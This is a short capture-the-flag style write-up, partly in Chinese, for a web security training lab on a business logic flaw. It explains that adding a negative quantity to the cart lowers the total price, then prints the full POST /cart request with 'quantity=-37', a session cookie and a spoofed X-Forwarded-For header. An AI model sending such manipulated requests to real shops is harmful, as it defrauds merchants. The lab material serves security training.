# Lab: High-level logic vulnerability

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

## Business Logic Vulnerabilities
* 題目說要買指定的商品，這個時候就是考驗小學數學的時候，因為我們可以買負數的數量，所以加加減減在 100 以內就可以了，記得目標商品一定要是正數
```
POST /cart HTTP/1.1
Host: acb41f0b1eb786e0c06658b3009a008d.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://acb41f0b1eb786e0c06658b3009a008d.web-security-academy.net
Connection: close
Referer: https://acb41f0b1eb786e0c06658b3009a008d.web-security-academy.net/cart
Cookie: session=i7JwNHWDKKbHuWLxJyOTCc2X2RtjNjae
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1

productId=2&quantity=-37&redir=CART
```